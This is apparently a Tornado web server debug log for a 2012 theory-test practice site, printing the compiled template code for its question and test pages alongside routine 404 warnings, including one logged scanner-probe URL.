 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:test/test.html code:
 1  def _execute():  # base.html:0
 2      _buffer = []  # base.html:0
 3      _append = _buffer.append  # base.html:0
 4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
 5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
 6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
 7      _tmp = static_url('css/base.css')  # base.html:25
 8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
 9      else: _tmp = _utf8(str(_tmp))  # base.html:25
10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
11      _append(_tmp)  # base.html:25
12      _append('" />\n')  # base.html:26
13      for css in kwargs['css_deps']:  # base.html:26
14          _append('\n<link href="')  # base.html:27
15          _tmp = static_url(css)  # base.html:27
16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
17          else: _tmp = _utf8(str(_tmp))  # base.html:27
18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
19          _append(_tmp)  # base.html:27
20          _append('" rel="stylesheet">\n')  # base.html:28
21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n<script type="text/javascript">\nvar _gaq = _gaq || [];\n_gaq.push([\'_setAccount\', \'UA-34526303-1\']);\n_gaq.push([\'_trackPageview\']);\n(function() {\nvar ga = document.createElement(\'script\'); ga.type = \'text/javascript\'; ga.async = true;\nga.src = (\'https:\' == document.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';\nvar s = document.getElementsByTagName(\'script\')[0]; s.parentNode.insertBefore(ga, s);\n})();\n</script>\n</head>\n<body >\n')  # base.html:56
22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:65 (via base.html:56)
23      _tmp = static_url('imgs/logo.png')  # base.html:65 (via base.html:56)
24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:65 (via base.html:56)
25      else: _tmp = _utf8(str(_tmp))  # base.html:65 (via base.html:56)
26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:65 (via base.html:56)
27      _append(_tmp)  # base.html:65 (via base.html:56)
28      _append('"></a>\n<div class="pull-right">\n')  # base.html:67 (via base.html:56)
29      if not current_user:  # base.html:67 (via base.html:56)
30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:69 (via base.html:56)
31      else:  # base.html:69 (via base.html:56)
32          _append('\n<ul class="nav nav-pills">\n')  # base.html:71 (via base.html:56)
33          if current_user['moderator']:  # base.html:71 (via base.html:56)
34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:73 (via base.html:56)
35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:80 (via base.html:56)
36          _tmp = static_url('imgs/user.png')  # base.html:80 (via base.html:56)
37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80 (via base.html:56)
38          else: _tmp = _utf8(str(_tmp))  # base.html:80 (via base.html:56)
39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:80 (via base.html:56)
40          _append(_tmp)  # base.html:80 (via base.html:56)
41          _append('"></a>\n')  # base.html:81 (via base.html:56)
42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:86 (via base.html:56)
43      _append('\n')  # base.html:88
44      _append('\n<div class="container">\n')  # test/test.html:5 (via base.html:88)
45      test=kwargs['test']  # test/test.html:5 (via base.html:88)
46      _append('\n')  # test/test.html:6 (via base.html:88)
47      _tmp = _modules.Question(test)  # test/test.html:6 (via base.html:88)
48      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # test/test.html:6 (via base.html:88)
49      else: _tmp = _utf8(str(_tmp))  # test/test.html:6 (via base.html:88)
50      _append(_tmp)  # test/test.html:6 (via base.html:88)
51      _append('\n</div>\n')  # test/test.html:8 (via base.html:88)
52      _append('\n')  # base.html:92
53      _tmp = xsrf_form_html()  # base.html:92
54      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:92
55      else: _tmp = _utf8(str(_tmp))  # base.html:92
56      _append(_tmp)  # base.html:92
57      _append('\n')  # base.html:93
58      _append('\n<script src="')  # base.html:94 (via base.html:93)
59      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:94 (via base.html:93)
60      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:94 (via base.html:93)
61      else: _tmp = _utf8(str(_tmp))  # base.html:94 (via base.html:93)
62      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:94 (via base.html:93)
63      _append(_tmp)  # base.html:94 (via base.html:93)
64      _append('"></script>\n<script src="')  # base.html:95 (via base.html:93)
65      _tmp = static_url('js/libs/blurb.min.js')  # base.html:95 (via base.html:93)
66      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:95 (via base.html:93)
67      else: _tmp = _utf8(str(_tmp))  # base.html:95 (via base.html:93)
68      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:95 (via base.html:93)
69      _append(_tmp)  # base.html:95 (via base.html:93)
70      _append('"></script>\n<script src="')  # base.html:96 (via base.html:93)
71      _tmp = static_url('js/IT.js')  # base.html:96 (via base.html:93)
72      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:96 (via base.html:93)
73      else: _tmp = _utf8(str(_tmp))  # base.html:96 (via base.html:93)
74      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:96 (via base.html:93)
75      _append(_tmp)  # base.html:96 (via base.html:93)
76      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:100 (via base.html:93)
77      _append('\n')  # base.html:102
78      for js in kwargs['js_deps']:  # base.html:102
79          _append('\n<script src="')  # base.html:103
80          _tmp = static_url(js)  # base.html:103
81          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:103
82          else: _tmp = _utf8(str(_tmp))  # base.html:103
83          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:103
84          _append(_tmp)  # base.html:103
85          _append('"></script>\n')  # base.html:104
86      _append('\n')  # base.html:106
87      _append('\n')  # test/test.html:11 (via base.html:106)
88      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:118
89      return _utf8('').join(_buffer)  # base.html:0
WARNING:root:404 GET /test (127.0.0.1) 0.75ms
WARNING:root:404 GET /static (127.0.0.1) 0.74ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:test/test.html code:
 1  def _execute():  # base.html:0
 2      _buffer = []  # base.html:0
 3      _append = _buffer.append  # base.html:0
 4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
 5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
 6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
 7      _tmp = static_url('css/base.css')  # base.html:25
 8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
 9      else: _tmp = _utf8(str(_tmp))  # base.html:25
10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
11      _append(_tmp)  # base.html:25
12      _append('" />\n')  # base.html:26
13      for css in kwargs['css_deps']:  # base.html:26
14          _append('\n<link href="')  # base.html:27
15          _tmp = static_url(css)  # base.html:27
16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
17          else: _tmp = _utf8(str(_tmp))  # base.html:27
18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
19          _append(_tmp)  # base.html:27
20          _append('" rel="stylesheet">\n')  # base.html:28
21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n<script type="text/javascript">\nvar _gaq = _gaq || [];\n_gaq.push([\'_setAccount\', \'UA-34526303-1\']);\n_gaq.push([\'_trackPageview\']);\n(function() {\nvar ga = document.createElement(\'script\'); ga.type = \'text/javascript\'; ga.async = true;\nga.src = (\'https:\' == document.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';\nvar s = document.getElementsByTagName(\'script\')[0]; s.parentNode.insertBefore(ga, s);\n})();\n</script>\n</head>\n<body >\n')  # base.html:56
22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:65 (via base.html:56)
23      _tmp = static_url('imgs/logo.png')  # base.html:65 (via base.html:56)
24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:65 (via base.html:56)
25      else: _tmp = _utf8(str(_tmp))  # base.html:65 (via base.html:56)
26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:65 (via base.html:56)
27      _append(_tmp)  # base.html:65 (via base.html:56)
28      _append('"></a>\n<div class="pull-right">\n')  # base.html:67 (via base.html:56)
29      if not current_user:  # base.html:67 (via base.html:56)
30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:69 (via base.html:56)
31      else:  # base.html:69 (via base.html:56)
32          _append('\n<ul class="nav nav-pills">\n')  # base.html:71 (via base.html:56)
33          if current_user['moderator']:  # base.html:71 (via base.html:56)
34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:73 (via base.html:56)
35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:80 (via base.html:56)
36          _tmp = static_url('imgs/user.png')  # base.html:80 (via base.html:56)
37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80 (via base.html:56)
38          else: _tmp = _utf8(str(_tmp))  # base.html:80 (via base.html:56)
39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:80 (via base.html:56)
40          _append(_tmp)  # base.html:80 (via base.html:56)
41          _append('"></a>\n')  # base.html:81 (via base.html:56)
42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:86 (via base.html:56)
43      _append('\n')  # base.html:88
44      _append('\n<div class="container">\n')  # test/test.html:5 (via base.html:88)
45      test=kwargs['test']  # test/test.html:5 (via base.html:88)
46      _append('\n')  # test/test.html:6 (via base.html:88)
47      _tmp = _modules.Question(test)  # test/test.html:6 (via base.html:88)
48      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # test/test.html:6 (via base.html:88)
49      else: _tmp = _utf8(str(_tmp))  # test/test.html:6 (via base.html:88)
50      _append(_tmp)  # test/test.html:6 (via base.html:88)
51      _append('\n</div>\n')  # test/test.html:8 (via base.html:88)
52      _append('\n')  # base.html:92
53      _tmp = xsrf_form_html()  # base.html:92
54      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:92
55      else: _tmp = _utf8(str(_tmp))  # base.html:92
56      _append(_tmp)  # base.html:92
57      _append('\n')  # base.html:93
58      _append('\n<script src="')  # base.html:94 (via base.html:93)
59      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:94 (via base.html:93)
60      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:94 (via base.html:93)
61      else: _tmp = _utf8(str(_tmp))  # base.html:94 (via base.html:93)
62      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:94 (via base.html:93)
63      _append(_tmp)  # base.html:94 (via base.html:93)
64      _append('"></script>\n<script src="')  # base.html:95 (via base.html:93)
65      _tmp = static_url('js/libs/blurb.min.js')  # base.html:95 (via base.html:93)
66      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:95 (via base.html:93)
67      else: _tmp = _utf8(str(_tmp))  # base.html:95 (via base.html:93)
68      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:95 (via base.html:93)
69      _append(_tmp)  # base.html:95 (via base.html:93)
70      _append('"></script>\n<script src="')  # base.html:96 (via base.html:93)
71      _tmp = static_url('js/IT.js')  # base.html:96 (via base.html:93)
72      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:96 (via base.html:93)
73      else: _tmp = _utf8(str(_tmp))  # base.html:96 (via base.html:93)
74      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:96 (via base.html:93)
75      _append(_tmp)  # base.html:96 (via base.html:93)
76      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:100 (via base.html:93)
77      _append('\n')  # base.html:102
78      for js in kwargs['js_deps']:  # base.html:102
79          _append('\n<script src="')  # base.html:103
80          _tmp = static_url(js)  # base.html:103
81          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:103
82          else: _tmp = _utf8(str(_tmp))  # base.html:103
83          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:103
84          _append(_tmp)  # base.html:103
85          _append('"></script>\n')  # base.html:104
86      _append('\n')  # base.html:106
87      _append('\n')  # test/test.html:11 (via base.html:106)
88      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:118
89      return _utf8('').join(_buffer)  # base.html:0
WARNING:root:404 GET /apple-touch-icon-114x114-precomposed.png (127.0.0.1) 0.80ms
WARNING:root:404 GET /apple-touch-icon-114x114.png (127.0.0.1) 1.28ms
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 1.36ms
WARNING:root:404 GET /apple-touch-icon.png (127.0.0.1) 2.97ms
WARNING:root:404 GET /w00tw00t.at.blackhats.romanian.anti-sec:) (127.0.0.1) 0.72ms
